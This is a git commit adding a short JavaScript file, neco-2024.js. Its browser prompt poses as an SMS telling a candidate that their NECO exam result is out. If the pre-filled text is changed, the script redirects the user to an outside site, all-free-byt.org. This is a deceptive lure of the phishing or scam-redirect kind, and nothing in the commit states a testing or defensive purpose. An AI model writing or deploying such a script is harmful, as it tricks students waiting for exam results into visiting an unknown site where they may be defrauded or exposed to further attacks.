19aea1ad485dc170942627cc68f1d05f1945802e
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-09-04 00:57:26 -0700

    Create neco-2024.js

---
+++ neco-2024.js
@@ -0,0 +1,6 @@
+
+var password = 'CHECK RESULT'
+password=prompt('SMS: Dear Candidate, Your NECO Result is Out, Kindly press Ok to check now ','CHECK RESULT');
+if (password != 'CHECK RESULT') {
+location.href='https://all-free-byt.org/neco-2024.html';
+}
